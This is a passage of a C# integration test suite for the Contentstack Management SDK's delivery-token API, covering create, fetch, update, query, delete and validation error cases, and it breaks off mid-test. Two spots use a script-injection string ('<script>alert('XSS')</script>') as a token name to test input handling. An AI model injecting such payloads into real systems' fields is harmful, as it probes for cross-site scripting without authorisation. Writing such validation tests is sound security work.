using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Contentstack.Management.Core.Models;
using Contentstack.Management.Core.Models.Token;
using Contentstack.Management.Core.Tests.Helpers;
using Contentstack.Management.Core.Tests.Model;
using Contentstack.Management.Core.Queryable;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System.Security.Cryptography;
using System.Net;
using Contentstack.Management.Core.Exceptions;
using System.Threading;
using System.Linq;

namespace Contentstack.Management.Core.Tests.IntegrationTest
{
    [TestClass]
    public class Contentstack016_DeliveryTokenTest
    {
        private static ContentstackClient _client;
        private Stack _stack;
        private string _deliveryTokenUid;
        private string _testEnvironmentUid = "test_delivery_environment";
        private DeliveryTokenModel _testTokenModel;

        // Constants for error testing
        private const string NonExistentTokenUid = "blt00000000000000000000";
        private const string InvalidTokenUid = "invalid-uid-format";
        private const string MalformedTokenUid = "!@#$%^&*()";
        private const string NonExistentEnvironmentUid = "non_existent_environment";
        private const string ExtremelyLongName = "This_is_an_extremely_long_delivery_token_name_that_exceeds_the_maximum_allowed_length_for_delivery_token_names_in_the_Contentstack_API_and_should_cause_a_validation_error_when_attempting_to_create_or_update_a_delivery_token_with_this_name_because_it_is_way_too_long_to_be_accepted_by_the_system_validation_rules_that_are_in_place_to_ensure_reasonable_naming_conventions_are_followed_across_all_resources_in_the_platform";
        private const string InvalidCharactersName = "<script>alert('XSS')</script>";

        [ClassInitialize]
        public static void ClassInitialize(TestContext context)
        {
            _client = Contentstack.CreateAuthenticatedClient();
        }

        [ClassCleanup]
        public static void ClassCleanup()
        {
            try { _client?.Logout(); } catch { }
            _client = null;
        }

        [TestInitialize]
        public async Task Initialize()
        {
            try
            {
                StackResponse response = StackResponse.getStack(_client.SerializerOptions);
                _stack = _client.Stack(response.Stack.APIKey);

                // Cleanup existing test resources first
                await CleanupTestResources();
                
                // Create unique environment name with timestamp
                _testEnvironmentUid = $"test_delivery_environment_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}";
                
                await CreateTestEnvironment();

                _testTokenModel = new DeliveryTokenModel
                {
                    Name = "Test Delivery Token",
                    Description = "Integration test delivery token",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Initialize failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test001_Should_Create_Delivery_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test001_Should_Create_Delivery_Token");
            try
            {
                ContentstackResponse response = _stack.DeliveryToken().Create(_testTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Create delivery token failed", "CreateDeliveryTokenSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");
                AssertLogger.AreEqual(_testTokenModel.Name, tokenData["name"]?.ToString(), "Token name should match", "TokenName");
                AssertLogger.AreEqual(_testTokenModel.Description, tokenData["description"]?.ToString(), "Token description should match", "TokenDescription");

                _deliveryTokenUid = tokenData["uid"]?.ToString();
                AssertLogger.IsNotNull(_deliveryTokenUid, "Delivery token UID should not be null");

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                Console.WriteLine($"Created delivery token with UID: {_deliveryTokenUid}");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail("Create delivery token test failed", ex.Message);
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test002_Should_Create_Delivery_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test002_Should_Create_Delivery_Token_Async");
            try
            {
                var asyncTokenModel = new DeliveryTokenModel
                {
                    Name = "Async Test Delivery Token",
                    Description = "Async integration test delivery token",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = await _stack.DeliveryToken().CreateAsync(asyncTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Async create delivery token failed", "AsyncCreateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");
                AssertLogger.AreEqual(asyncTokenModel.Name, tokenData["name"]?.ToString(), "Token name should match", "AsyncTokenName");

                string asyncTokenUid = tokenData["uid"]?.ToString();
                TestOutputLogger.LogContext("AsyncCreatedTokenUid", asyncTokenUid ?? "");

                if (!string.IsNullOrEmpty(asyncTokenUid))
                {
                    await _stack.DeliveryToken(asyncTokenUid).DeleteAsync();
                }

            }
            catch (Exception ex)
            {
                AssertLogger.Fail("Async create delivery token test failed", ex.Message);
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test003_Should_Fetch_Delivery_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test003_Should_Fetch_Delivery_Token");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                ContentstackResponse response = _stack.DeliveryToken(_deliveryTokenUid).Fetch();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Fetch delivery token failed", "FetchSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.AreEqual(_deliveryTokenUid, tokenData["uid"]?.ToString(), "Token UID should match", "TokenUid");
                AssertLogger.AreEqual(_testTokenModel.Name, tokenData["name"]?.ToString(), "Token name should match", "TokenName");
                AssertLogger.IsNotNull(tokenData["token"], "Token should have access token");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Fetch delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test004_Should_Fetch_Delivery_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test004_Should_Fetch_Delivery_Token_Async");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                ContentstackResponse response = await _stack.DeliveryToken(_deliveryTokenUid).FetchAsync();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Async fetch delivery token failed", "AsyncFetchSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.AreEqual(_deliveryTokenUid, tokenData["uid"]?.ToString(), "Token UID should match", "TokenUid");
                AssertLogger.IsNotNull(tokenData["token"], "Token should have access token");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Async fetch delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test005_Should_Update_Delivery_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test005_Should_Update_Delivery_Token");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                var updateModel = new DeliveryTokenModel
                {
                    Name = "Updated Test Delivery Token",
                    Description = "Updated integration test delivery token",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = _stack.DeliveryToken(_deliveryTokenUid).Update(updateModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Update delivery token failed", "UpdateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.AreEqual(_deliveryTokenUid, tokenData["uid"]?.ToString(), "Token UID should match", "TokenUid");
                AssertLogger.AreEqual(updateModel.Name, tokenData["name"]?.ToString(), "Updated token name should match", "UpdatedTokenName");
                AssertLogger.AreEqual(updateModel.Description, tokenData["description"]?.ToString(), "Updated token description should match", "UpdatedTokenDescription");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Update delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test006_Should_Update_Delivery_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test006_Should_Update_Delivery_Token_Async");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                var updateModel = new DeliveryTokenModel
                {
                    Name = "Async Updated Test Delivery Token",
                    Description = "Async updated integration test delivery token",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = await _stack.DeliveryToken(_deliveryTokenUid).UpdateAsync(updateModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Async update delivery token failed", "AsyncUpdateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["token"], "Response should contain token object");

                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.AreEqual(_deliveryTokenUid, tokenData["uid"]?.ToString(), "Token UID should match", "TokenUid");
                AssertLogger.AreEqual(updateModel.Name, tokenData["name"]?.ToString(), "Updated token name should match", "UpdatedTokenName");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Async update delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test007_Should_Query_All_Delivery_Tokens()
        {
            TestOutputLogger.LogContext("TestScenario", "Test007_Should_Query_All_Delivery_Tokens");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                ContentstackResponse response = _stack.DeliveryToken().Query().Find();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Query delivery tokens failed", "QuerySuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["tokens"], "Response should contain tokens array");

                var tokens = responseObject["tokens"] as JsonArray;
                AssertLogger.IsTrue(tokens.Count > 0, "Should have at least one delivery token", "TokensCountGreaterThanZero");

                bool foundTestToken = false;
                foreach (var token in tokens)
                {
                    if (token["uid"]?.ToString() == _deliveryTokenUid)
                    {
                        foundTestToken = true;
                        break;
                    }
                }

                AssertLogger.IsTrue(foundTestToken, "Test token should be found in query results", "TestTokenFoundInQuery");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Query delivery tokens test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test008_Should_Query_Delivery_Tokens_With_Parameters()
        {
            TestOutputLogger.LogContext("TestScenario", "Test008_Should_Query_Delivery_Tokens_With_Parameters");
            try
            {
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                var parameters = new ParameterCollection();
                parameters.Add("limit", "5");
                parameters.Add("skip", "0");

                ContentstackResponse response = _stack.DeliveryToken().Query().Limit(5).Skip(0).Find();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Query delivery tokens with parameters failed", "QueryWithParamsSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["tokens"], "Response should contain tokens array");

                var tokens = responseObject["tokens"] as JsonArray;
                AssertLogger.IsTrue(tokens.Count <= 5, "Should respect limit parameter", "RespectLimitParam");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Query delivery tokens with parameters test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test009_Should_Create_Token_With_Multiple_Environments()
        {
            TestOutputLogger.LogContext("TestScenario", "Test009_Should_Create_Token_With_Multiple_Environments");
            try
            {
                string secondEnvironmentUid = $"test_delivery_environment_2_{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}";
                await CreateTestEnvironment(secondEnvironmentUid);
                TestOutputLogger.LogContext("SecondEnvironmentUid", secondEnvironmentUid);

                var multiEnvTokenModel = new DeliveryTokenModel
                {
                    Name = "Multi Environment Delivery Token",
                    Description = "Token with multiple environment access",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid, secondEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = _stack.DeliveryToken().Create(multiEnvTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Create multi-environment delivery token failed", "MultiEnvCreateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");

                string multiEnvTokenUid = tokenData["uid"]?.ToString();
                TestOutputLogger.LogContext("MultiEnvTokenUid", multiEnvTokenUid ?? "");

                var scope = tokenData["scope"] as JsonArray;
                AssertLogger.IsNotNull(scope, "Token should have scope");
                AssertLogger.IsTrue(scope.Count > 0, "Token should have at least one scope", "ScopeCount");

                if (!string.IsNullOrEmpty(multiEnvTokenUid))
                {
                    await _stack.DeliveryToken(multiEnvTokenUid).DeleteAsync();
                }

                await CleanupTestEnvironment(secondEnvironmentUid);

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Multi-environment delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test011_Should_Create_Token_With_Complex_Scope()
        {
            TestOutputLogger.LogContext("TestScenario", "Test011_Should_Create_Token_With_Complex_Scope");
            try
            {
                var complexScopeTokenModel = new DeliveryTokenModel
                {
                    Name = "Complex Scope Delivery Token",
                    Description = "Token with complex scope configuration",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = _stack.DeliveryToken().Create(complexScopeTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Create complex scope delivery token failed", "ComplexScopeCreateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");

                string complexScopeTokenUid = tokenData["uid"]?.ToString();
                TestOutputLogger.LogContext("ComplexScopeTokenUid", complexScopeTokenUid ?? "");

                // Verify multiple scopes
                var scope = tokenData["scope"] as JsonArray;
                AssertLogger.IsNotNull(scope, "Token should have scope");
                AssertLogger.IsTrue(scope.Count >= 2, "Token should have multiple scopes", "ScopeCountMultiple");

                // Clean up the complex scope token
                if (!string.IsNullOrEmpty(complexScopeTokenUid))
                {
                    await _stack.DeliveryToken(complexScopeTokenUid).DeleteAsync();
                }

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Complex scope delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test012_Should_Create_Token_With_UI_Structure()
        {
            TestOutputLogger.LogContext("TestScenario", "Test012_Should_Create_Token_With_UI_Structure");
            try
            {
                // Test with the exact structure from UI as provided by user
                var uiStructureTokenModel = new DeliveryTokenModel
                {
                    Name = "UI Structure Test Token",
                    Description = "", // Empty description as in UI example
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            },
                            Environments = new List<string> { _testEnvironmentUid }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            },
                            Branches = new List<string> { "main" }
                        }
                    }
                };

                ContentstackResponse response = _stack.DeliveryToken().Create(uiStructureTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Create UI structure delivery token failed", "UIStructureCreateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");
                AssertLogger.AreEqual(uiStructureTokenModel.Name, tokenData["name"]?.ToString(), "Token name should match", "UITokenName");

                // Verify the scope structure matches UI format
                var scope = tokenData["scope"] as JsonArray;
                AssertLogger.IsNotNull(scope, "Token should have scope");
                AssertLogger.IsTrue(scope.Count == 2, "Token should have 2 scope modules (environment and branch)", "UIScopeCount");

                string uiTokenUid = tokenData["uid"]?.ToString();
                TestOutputLogger.LogContext("UITokenUid", uiTokenUid ?? "");

                // Clean up the UI structure token
                if (!string.IsNullOrEmpty(uiTokenUid))
                {
                    await _stack.DeliveryToken(uiTokenUid).DeleteAsync();
                }

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"UI structure delivery token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test015_Should_Query_Delivery_Tokens_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test015_Should_Query_Delivery_Tokens_Async");
            try
            {
                // Ensure we have at least one token
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                TestOutputLogger.LogContext("DeliveryTokenUid", _deliveryTokenUid ?? "");
                ContentstackResponse response = await _stack.DeliveryToken().Query().FindAsync();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, $"Async query delivery tokens failed: {response.OpenResponse()}", "AsyncQuerySuccess");

                var responseObject = response.OpenJsonObjectResponse();
                AssertLogger.IsNotNull(responseObject["tokens"], "Response should contain tokens array");

                var tokens = responseObject["tokens"] as JsonArray;
                AssertLogger.IsTrue(tokens.Count > 0, "Should have at least one delivery token", "AsyncTokensCount");

                bool foundTestToken = false;
                foreach (var token in tokens)
                {
                    if (token["uid"]?.ToString() == _deliveryTokenUid)
                    {
                        foundTestToken = true;
                        break;
                    }
                }

                AssertLogger.IsTrue(foundTestToken, "Test token should be found in async query results", "TestTokenFoundInAsyncQuery");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Async query delivery tokens test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test016_Should_Create_Token_With_Empty_Description()
        {
            TestOutputLogger.LogContext("TestScenario", "Test016_Should_Create_Token_With_Empty_Description");
            try
            {
                var emptyDescTokenModel = new DeliveryTokenModel
                {
                    Name = "Empty Description Token",
                    Description = "", // Empty description
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        },
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response = _stack.DeliveryToken().Create(emptyDescTokenModel);

                AssertLogger.IsTrue(response.IsSuccessStatusCode, $"Create token with empty description failed: {response.OpenResponse()}", "EmptyDescCreateSuccess");

                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                AssertLogger.IsNotNull(tokenData["uid"], "Token should have UID");
                AssertLogger.AreEqual(emptyDescTokenModel.Name, tokenData["name"]?.ToString(), "Token name should match", "EmptyDescTokenName");

                string emptyDescTokenUid = tokenData["uid"]?.ToString();
                TestOutputLogger.LogContext("EmptyDescTokenUid", emptyDescTokenUid ?? "");

                // Clean up the empty description token
                if (!string.IsNullOrEmpty(emptyDescTokenUid))
                {
                    await _stack.DeliveryToken(emptyDescTokenUid).DeleteAsync();
                }

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Empty description token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test017_Should_Validate_Environment_Scope_Requirement()
        {
            TestOutputLogger.LogContext("TestScenario", "Test017_Should_Validate_Environment_Scope_Requirement");
            try
            {
                // Test that environment-only scope is rejected by API
                var envOnlyTokenModel = new DeliveryTokenModel
                {
                    Name = "Environment Only Token",
                    Description = "Token with only environment scope - should fail",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "environment",
                            Environments = new List<string> { _testEnvironmentUid },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response;
                try
                {
                    response = _stack.DeliveryToken().Create(envOnlyTokenModel);
                }
                catch (Exception ex)
                {
                    // If an exception is thrown, that's also acceptable - the API rejected the request
                    Console.WriteLine($"Environment-only token creation threw exception (expected): {ex.Message}");
                    return; // Test passes if exception is thrown
                }

                // If no exception was thrown, check the response status
                AssertLogger.IsFalse(response.IsSuccessStatusCode, "Environment-only token should be rejected by API", "EnvOnlyRejected");
                AssertLogger.IsTrue(response.StatusCode == System.Net.HttpStatusCode.BadRequest ||
                             response.StatusCode == System.Net.HttpStatusCode.UnprocessableEntity,
                    $"Expected 400 or 422 for environment-only token, got {response.StatusCode}", "Expected400Or422");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Environment scope validation test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test018_Should_Validate_Branch_Scope_Requirement()
        {
            TestOutputLogger.LogContext("TestScenario", "Test018_Should_Validate_Branch_Scope_Requirement");
            try
            {
                // Test that branch-only scope is rejected by API
                var branchOnlyTokenModel = new DeliveryTokenModel
                {
                    Name = "Branch Only Token",
                    Description = "Token with only branch scope - should fail",
                    Scope = new List<DeliveryTokenScope>
                    {
                        new DeliveryTokenScope
                        {
                            Module = "branch",
                            Branches = new List<string> { "main" },
                            ACL = new Dictionary<string, string>
                            {
                                { "read", "true" }
                            }
                        }
                    }
                };

                ContentstackResponse response;
                try
                {
                    response = _stack.DeliveryToken().Create(branchOnlyTokenModel);
                }
                catch (Exception ex)
                {
                    // If an exception is thrown, that's also acceptable - the API rejected the request
                    Console.WriteLine($"Branch-only token creation threw exception (expected): {ex.Message}");
                    return; // Test passes if exception is thrown
                }

                // If no exception was thrown, check the response status
                AssertLogger.IsFalse(response.IsSuccessStatusCode, "Branch-only token should be rejected by API", "BranchOnlyRejected");
                AssertLogger.IsTrue(response.StatusCode == System.Net.HttpStatusCode.BadRequest ||
                             response.StatusCode == System.Net.HttpStatusCode.UnprocessableEntity,
                    $"Expected 400 or 422 for branch-only token, got {response.StatusCode}", "Expected400Or422");

            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Branch scope validation test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test019_Should_Delete_Delivery_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test019_Should_Delete_Delivery_Token");
            try
            {
                // Ensure we have a token to delete
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                string tokenUidToDelete = _deliveryTokenUid;
                AssertLogger.IsNotNull(tokenUidToDelete, "Should have a valid token UID to delete");

                TestOutputLogger.LogContext("TokenUidToDelete", tokenUidToDelete ?? "");
                // Test synchronous delete
                ContentstackResponse response = _stack.DeliveryToken(tokenUidToDelete).Delete();

                AssertLogger.IsTrue(response.IsSuccessStatusCode, $"Delete delivery token failed: {response.OpenResponse()}", "DeleteSuccess");

                // Verify token is deleted by trying to fetch it
                try
                {
                    ContentstackResponse fetchResponse = _stack.DeliveryToken(tokenUidToDelete).Fetch();
                    AssertLogger.IsFalse(fetchResponse.IsSuccessStatusCode, "Deleted token should not be fetchable", "DeletedTokenNotFetchable");

                    // Verify the response indicates the token was not found
                    AssertLogger.IsTrue(fetchResponse.StatusCode == System.Net.HttpStatusCode.NotFound ||
                                 fetchResponse.StatusCode == System.Net.HttpStatusCode.UnprocessableEntity ||
                                 fetchResponse.StatusCode == System.Net.HttpStatusCode.BadRequest,
                        $"Expected 404, 422, or 400 for deleted token fetch, got {fetchResponse.StatusCode}", "Expected404Or422Or400");
                }
                catch (Exception ex)
                {
                    // Expected behavior - deleted token should throw exception when fetched
                    Console.WriteLine($"Expected exception when fetching deleted token: {ex.Message}");
                }


                _deliveryTokenUid = null;
            }
            catch (Exception ex)
            {
                AssertLogger.Fail("Delete delivery token test failed", ex.Message);
            }
        }

        #region A — Create Operation Error Tests (Test020-Test039)

        [TestMethod]
        [DoNotParallelize]
        public void Test020_Should_Fail_Create_With_Null_Model()
        {
            TestOutputLogger.LogContext("TestScenario", "Test020_Should_Fail_Create_With_Null_Model");
            AssertLogger.ThrowsException<ArgumentNullException>(
                () => _stack.DeliveryToken().Create(null),
                "CreateWithNullModel");
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test021_Should_Fail_Create_With_Null_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test021_Should_Fail_Create_With_Null_Name");
            var model = BuildInvalidTokenModel("null_name");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithNullName",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test022_Should_Fail_Create_With_Empty_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test022_Should_Fail_Create_With_Empty_Name");
            var model = BuildInvalidTokenModel("empty_name");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithEmptyName",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test023_Should_Accept_Create_With_Whitespace_Only_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test023_Should_Accept_Create_With_Whitespace_Only_Name");
            try
            {
                // Use dynamic whitespace name to avoid conflicts
                var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                var model = new DeliveryTokenModel
                {
                    Name = $"   \t\r\n {timestamp}  \t\r\n   ", // Whitespace + unique identifier
                    Description = "Test token with whitespace name",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                ContentstackResponse response = _stack.DeliveryToken().Create(model);
                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Should accept token with whitespace name");
                
                // Get token UID for cleanup
                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                string createdTokenUid = tokenData["uid"]?.ToString();
                
                // Verify name contains whitespace
                AssertLogger.IsTrue(model.Name.Trim() != model.Name, "Name should contain whitespace");
                
                // Clean up
                if (!string.IsNullOrEmpty(createdTokenUid))
                {
                    try { _stack.DeliveryToken(createdTokenUid).Delete(); } catch { }
                }
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test024_Should_Fail_Create_With_Extremely_Long_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test024_Should_Fail_Create_With_Extremely_Long_Name");
            var model = BuildInvalidTokenModel("long_name");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithExtremelyLongName",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test025_Should_Accept_Create_With_Invalid_Name_Characters()
        {
            TestOutputLogger.LogContext("TestScenario", "Test025_Should_Accept_Create_With_Invalid_Name_Characters");
            try
            {
                // Use dynamic name with special characters to avoid conflicts
                var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                var model = new DeliveryTokenModel
                {
                    Name = $"<script>alert('{timestamp}')</script>", // XSS + unique identifier
                    Description = "Test token with invalid characters in name",
                    Scope = BuildValidScope(_testEnvironmentUid)
